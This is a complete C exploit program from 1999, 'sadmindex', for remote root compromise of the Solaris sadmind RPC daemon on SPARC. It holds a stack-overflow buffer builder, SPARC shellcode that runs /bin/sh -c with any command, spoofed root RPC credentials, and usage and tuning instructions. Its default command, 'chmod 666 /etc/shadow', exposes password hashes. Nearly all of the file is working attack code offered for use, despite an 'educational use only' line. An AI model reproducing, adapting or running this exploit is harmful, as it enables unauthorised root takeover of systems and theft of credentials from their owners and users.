/**
***  sadmindex - SPARC Solaris remote root exploit for /usr/sbin/sadmind
***
***  Tested and confirmed under Solaris 2.6 and 7.0 (SPARC)
***
***  Usage:  % sadmindex -h hostname -c command -s sp [-o offset] \
***                      [-a alignment] [-p]
***
***  where hostname is the hostname of the machine running the vulnerable
***  system administration daemon, command is the command to run as root
***  on the vulnerable machine, sp is the %sp stack pointer value, offset
***  is the number of bytes to add to sp to calculate the desired return
***  address, and alignment is the number of bytes needed to correctly
***  align the contents of the exploit buffer.
***
***  If run with a -p option, the exploit will only "ping" sadmind on the
***  remote machine to start it running.  The daemon will be otherwise
***  untouched.  Since pinging the daemon does not require an exploit
***  buffer to be constructed, you can safely omit the -c and -s options
***  if you use -p.
***
***  When specifying a command, be sure to pass it to the exploit as a
***  single argument, namely enclose the command string in quotes if it
***  contains spaces or other special shell delimiter characters.  The
***  exploit will pass this string without modification to /bin/sh -c on
***  the remote machine, so any normally allowed Bourne shell syntax is
***  also allowed in the command string.  The command string and the
***  assembly code to run it must fit inside a buffer of 512 bytes, so
***  the command string has a maximum length of about 380 bytes or so.
***
***  Due to the nature of the target overflow in sadmind, the exploit is
***  extremely sensitive to the %sp stack pointer value that is provided
***  when the exploit is run.  The %sp stack pointer must be specified
***  with the exact required value, leaving no room for error.  I have
***  provided confirmed values for Solaris running on a Sun SPARCengine
***  Ultra AXi machine running Solaris 2.6 5/98 and on a SPARCstation 1
***  running Solaris 7.0 10/98.  On each system, sadmind was started from
***  an instance of inetd that was started at boot time by init.  There
***  is a strong possibility that the demonstration values will not work
***  due to differing sets of environment variables, for example if the
***  the running inetd on the remote machine was started manually from an
***  interactive shell.  If you find that the sample value for %sp does
***  not work, try adjusting the value by -2048 to 2048 from the sample in
***  increments of 8 for starters.  The offset parameter and the alignment
***  parameter have default values that will be used if no overriding
***  values are specified on the command line.  The default values should
***  be suitable and it will not likely be necessary to override them.
***
***  Demonstration values for SPARC Solaris:
***
***  (2.6)  sadmindex -h host.example.com -c "touch HEH" -s 0xefff9580
***  (7.0)  sadmindex -h host.example.com -c "touch HEH" -s 0xefff9418
***
***  THIS CODE FOR EDUCATIONAL USE ONLY IN AN ETHICAL MANNER
***
***  Cheez Whiz
***  cheezbeast@hotmail.com
***
***  June 24, 1999
**/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <rpc/rpc.h>

#define NETMGT_PROG 100232
#define NETMGT_VERS 10
#define NETMGT_PROC_PING 0
#define NETMGT_PROC_SERVICE 1

#define NETMGT_UDP_PING_TIMEOUT 30
#define NETMGT_UDP_PING_RETRY_TIMEOUT 5
#define NETMGT_UDP_SERVICE_TIMEOUT 1
#define NETMGT_UDP_SERVICE_RETRY_TIMEOUT 2

#define NETMGT_HEADER_TYPE 6
#define NETMGT_ARG_INT 3
#define NETMGT_ARG_STRING 9
#define NETMGT_ENDOFARGS "netmgt_endofargs"

#define ADM_FW_VERSION "ADM_FW_VERSION"
#define ADM_CLIENT_DOMAIN "ADM_CLIENT_DOMAIN"
#define ADM_FENCE "ADM_FENCE"

#define BUFLEN 1076		/* 256+256+32+32+512-12 */
#define ADDRLEN 560		/* 256+256+32+32-4-12 */
#define FRAMELEN1 608
#define FRAMELEN2 4200
#define LEN 84

#define OFFSET 688		/* default offset */
#define ALIGNMENT 4		/* default alignment */

#define NOP 0x801bc00f		/* xor %o7,%o7,%g0 */

char shell[] =
/*   0 */ "\x20\xbf\xff\xff"                 /* bn,a ?          */
/* skip:                                                        */
/*   4 */ "\x20\xbf\xff\xff"                 /* bn,a ?          */
/*   8 */ "\x7f\xff\xff\xff"                 /* call skip       */
/* execve:                                                      */
/*  12 */ "\x90\x03\xe0\x5c"                 /* add %o7,92,%o0  */
/*  16 */ "\x92\x22\x20\x10"                 /* sub %o0,16,%o1  */
/*  20 */ "\x94\x1b\xc0\x0f"                 /* xor %o7,%o7,%o2 */
/*  24 */ "\xec\x02\x3f\xf0"                 /* ld [%o0-16],%l6 */
/*  28 */ "\xac\x22\x80\x16"                 /* sub %o2,%l6,%l6 */
/*  32 */ "\xae\x02\x60\x10"                 /* add %o1,16,%l7  */
/*  36 */ "\xee\x22\x3f\xf0"                 /* st %l7,[%o0-16] */
/*  40 */ "\xae\x05\xe0\x08"                 /* add %l7,8,%l7   */
/*  44 */ "\xc0\x2d\xff\xff"                 /* stb %g0,[%l7-1] */
/*  48 */ "\xee\x22\x3f\xf4"                 /* st %l7,[%o0-12] */
/*  52 */ "\xae\x05\xe0\x03"                 /* add %l7,3,%l7   */
/*  56 */ "\xc0\x2d\xff\xff"                 /* stb %g0,[%l7-1] */
/*  60 */ "\xee\x22\x3f\xf8"                 /* st %l7,[%o0-8]  */
/*  64 */ "\xae\x05\xc0\x16"                 /* add %l7,%l6,%l7 */
/*  68 */ "\xc0\x2d\xff\xff"                 /* stb %g0,[%l7-1] */
/*  72 */ "\xc0\x22\x3f\xfc"                 /* st %g0,[%o0-4]  */
/*  76 */ "\x82\x10\x20\x3b"                 /* mov 59,%g1      */
/*  80 */ "\x91\xd0\x20\x08"                 /* ta 8            */
/* data:                                                        */
/*  84 */ "\xff\xff\xff\xff"                 /* DATA            */
/*  88 */ "\xff\xff\xff\xff"                 /* DATA            */
/*  92 */ "\xff\xff\xff\xff"                 /* DATA            */
/*  96 */ "\xff\xff\xff\xff"                 /* DATA            */
/* 100 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA            */
/* 108 */ "\x2d\x63\xff";                    /* DATA            */

extern char *optarg;

struct nm_send_header {
    struct timeval timeval1;
    struct timeval timeval2;
    struct timeval timeval3;
    unsigned int uint1;
    unsigned int uint2;
    unsigned int uint3;
    unsigned int uint4;
    unsigned int uint5;
    struct in_addr inaddr1;
    struct in_addr inaddr2;
    unsigned long ulong1;
    unsigned long ulong2;
    struct in_addr inaddr3;
    unsigned long ulong3;
    unsigned long ulong4;
    unsigned long ulong5;
    struct timeval timeval4;
    unsigned int uint6;
    struct timeval timeval5;
    char *string1;
    char *string2;
    char *string3;
    unsigned int uint7;
};

struct nm_send_arg_int {
    char *string1;
    unsigned int uint1;
    unsigned int uint2;
    int int1;
    unsigned int uint3;
    unsigned int uint4;
};

struct nm_send_arg_string {
    char *string1;
    unsigned int uint1;
    unsigned int uint2;
    char *string2;
    unsigned int uint3;
    unsigned int uint4;
};

struct nm_send_footer {
    char *string1;
};

struct nm_send {
    struct nm_send_header header;
    struct nm_send_arg_int version;
    struct nm_send_arg_string string;
    struct nm_send_arg_int fence;
    struct nm_send_footer footer;
};

struct nm_reply {
    unsigned int uint1;
    unsigned int uint2;
    char *string1;
};

bool_t
xdr_nm_send_header(XDR *xdrs, struct nm_send_header *objp)
{
    char *addr;
    size_t size = sizeof(struct in_addr);

    if (!xdr_long(xdrs, &objp->timeval1.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval1.tv_usec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval2.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval2.tv_usec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval3.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval3.tv_usec))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint2))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint3))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint4))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint5))
	return (FALSE);
    addr = (char *) &objp->inaddr1.s_addr;
    if (!xdr_bytes(xdrs, &addr, &size, size))
	return (FALSE);
    addr = (char *) &objp->inaddr2.s_addr;
    if (!xdr_bytes(xdrs, &addr, &size, size))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong1))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong2))
	return (FALSE);
    addr = (char *) &objp->inaddr3.s_addr;
    if (!xdr_bytes(xdrs, &addr, &size, size))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong3))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong4))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong5))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval4.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval4.tv_usec))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint6))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval5.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval5.tv_usec))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string2))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string3))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint7))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_send_arg_int(XDR *xdrs, struct nm_send_arg_int *objp)
{
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint2))
	return (FALSE);
    if (!xdr_int(xdrs, &objp->int1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint3))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint4))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_send_arg_string(XDR *xdrs, struct nm_send_arg_string *objp)
{
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint2))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string2))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint3))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint4))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_send_footer(XDR *xdrs, struct nm_send_footer *objp)
{
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_send(XDR *xdrs, struct nm_send *objp)
{
    if (!xdr_nm_send_header(xdrs, &objp->header))
	return (FALSE);
    if (!xdr_nm_send_arg_int(xdrs, &objp->version))
	return (FALSE);
    if (!xdr_nm_send_arg_string(xdrs, &objp->string))
	return (FALSE);
    if (!xdr_nm_send_arg_int(xdrs, &objp->fence))
	return (FALSE);
    if (!xdr_nm_send_footer(xdrs, &objp->footer))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_reply(XDR *xdrs, struct nm_reply *objp)
{
    if (!xdr_u_int(xdrs, &objp->uint1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint2))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    return (TRUE);
}

int
main(int argc, char *argv[])
{
    CLIENT *cl;
    struct nm_send send;
    struct nm_reply reply;
    struct timeval tm;
    enum clnt_stat stat;
    int c, i, len, slen, clen;
    char *program, *cp, buf[BUFLEN+1];
    char *hostname, *command;
    int offset, alignment, pinging = 0;
    unsigned long int sp = 0, fp, addr;

    program = argv[0];
    hostname = "localhost";
    command = "chmod 666 /etc/shadow";
    offset = OFFSET; alignment = ALIGNMENT;
    while ((c = getopt(argc, argv, "h:c:s:o:a:p")) != EOF) {
	switch (c) {
	case 'h':
	    hostname = optarg;
	    break;
	case 'c':
	    command = optarg; 
	    break;
	case 's':
	    sp = strtoul(optarg, NULL, 0);
	    break;
	case 'o':
	    offset = (int) strtol(optarg, NULL, 0);
	    break;
	case 'a':
	    alignment = (int) strtol(optarg, NULL, 0);
	    break;
	case 'p':
	    pinging = 1;
	    break;
	default:
	    fprintf(stderr, "usage: %s -h hostname -c command -s sp "
		    "[-o offset] [-a alignment] [-p]\n", program);
	    exit(1);
	    break;
	}
    }
    memset(buf, '\xff', BUFLEN);
    fp = sp + FRAMELEN1 + FRAMELEN2; fp &= 0xfffffff8;
    addr = sp + offset; addr &= 0xfffffffc;
    for (i = 0, cp = buf + alignment; i < ADDRLEN / 8; i++) {
	*cp++ = (fp >> 24) & 0xff;
	*cp++ = (fp >> 16) & 0xff;
	*cp++ = (fp >>  8) & 0xff;
	*cp++ = (fp >>  0) & 0xff;
	*cp++ = (addr >> 24) & 0xff;
	*cp++ = (addr >> 16) & 0xff;
	*cp++ = (addr >>  8) & 0xff;
	*cp++ = (addr >>  0) & 0xff;
    }
    slen = strlen(shell); clen = strlen(command);
    len = BUFLEN - 1 - clen - slen - ADDRLEN - alignment; len &= 0xfffffffc;
    for (i = 0; i < len / 4; i++) {
	*cp++ = (NOP >> 24) & 0xff;
	*cp++ = (NOP >> 16) & 0xff;
	*cp++ = (NOP >>  8) & 0xff;
	*cp++ = (NOP >>  0) & 0xff;
    }
    len = clen; len++; len = -len;
    shell[LEN+0] = (len >> 24) & 0xff;
    shell[LEN+1] = (len >> 16) & 0xff;
    shell[LEN+2] = (len >>  8) & 0xff;
    shell[LEN+3] = (len >>  0) & 0xff;
    memcpy(cp, shell, slen); cp += slen;
    memcpy(cp, command, clen);
    buf[BUFLEN] = '\0';
    memset(&send, 0, sizeof(struct nm_send));
    send.header.uint2 = NETMGT_HEADER_TYPE;
    send.header.string1 = "";
    send.header.string2 = "";
    send.header.string3 = "";
    send.header.uint7 =
	strlen(ADM_FW_VERSION) + 1 +
	(4 * sizeof(unsigned int)) + sizeof(int) +
	strlen(ADM_CLIENT_DOMAIN) + 1 +
	(4 * sizeof(unsigned int)) + strlen(buf) + 1 +
	strlen(ADM_FENCE) + 1 +
	(4 * sizeof(unsigned int)) + sizeof(int) +
	strlen(NETMGT_ENDOFARGS) + 1;
    send.version.string1 = ADM_FW_VERSION;
    send.version.uint1 = NETMGT_ARG_INT;
    send.version.uint2 = sizeof(int);
    send.version.int1 = 1;
    send.string.string1 = ADM_CLIENT_DOMAIN;
    send.string.uint1 = NETMGT_ARG_STRING;
    send.string.uint2 = strlen(buf);
    send.string.string2 = buf;
    send.fence.string1 = ADM_FENCE;
    send.fence.uint1 = NETMGT_ARG_INT;
    send.fence.uint2 = sizeof(int);
    send.fence.int1 = 666;
    send.footer.string1 = NETMGT_ENDOFARGS;
    cl = clnt_create(hostname, NETMGT_PROG, NETMGT_VERS, "udp");
    if (cl == NULL) {
	clnt_pcreateerror("clnt_create");
	exit(1);
    }
    cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);
    if (!pinging) {
	fprintf(stdout,
		"%%sp 0x%08lx offset %d --> return address 0x%08lx [%d]\n",
		sp, offset, addr, alignment);
	fprintf(stdout,
		"%%sp 0x%08lx with frame length %d --> %%fp 0x%08lx\n",
		sp, FRAMELEN1 + FRAMELEN2, fp);
	tm.tv_sec = NETMGT_UDP_SERVICE_TIMEOUT; tm.tv_usec = 0;
	if (!clnt_control(cl, CLSET_TIMEOUT, (char *) &tm)) {
	    fprintf(stderr, "exploit failed; unable to set timeout\n");
	    exit(1);
	}
	tm.tv_sec = NETMGT_UDP_SERVICE_RETRY_TIMEOUT; tm.tv_usec = 0;
	if (!clnt_control(cl, CLSET_RETRY_TIMEOUT, (char *) &tm)) {
	    fprintf(stderr, "exploit failed; unable to set timeout\n");
	    exit(1);
	}
	stat = clnt_call(cl, NETMGT_PROC_SERVICE,
			 xdr_nm_send, (caddr_t) &send,
			 xdr_nm_reply, (caddr_t) &reply, tm);
	if (stat != RPC_SUCCESS) {
	    clnt_perror(cl, "clnt_call");
	    fprintf(stdout, "now check if exploit worked; "
		    "RPC failure was expected\n");
	    exit(0);
	}
	fprintf(stderr, "exploit failed; "
		"RPC succeeded and returned { %u, %u, \"%s\" }\n",
		reply.uint1, reply.uint2, reply.string1);
	clnt_destroy(cl);
	exit(1);
    } else {
	tm.tv_sec = NETMGT_UDP_PING_TIMEOUT; tm.tv_usec = 0;
	if (!clnt_control(cl, CLSET_TIMEOUT, (char *) &tm)) {
	    fprintf(stderr, "exploit failed; unable to set timeout\n");
	    exit(1);
	}
	tm.tv_sec = NETMGT_UDP_PING_RETRY_TIMEOUT; tm.tv_usec = 0;
	if (!clnt_control(cl, CLSET_RETRY_TIMEOUT, (char *) &tm)) {
	    fprintf(stderr, "exploit failed; unable to set timeout\n");
	    exit(1);
	}
	stat = clnt_call(cl, NETMGT_PROC_PING,
			 xdr_void, NULL,
			 xdr_void, NULL, tm);
	if (stat != RPC_SUCCESS) {
	    clnt_perror(cl, "clnt_call");
	    exit(1);
	}
	clnt_destroy(cl);
	exit(0);
    }
}
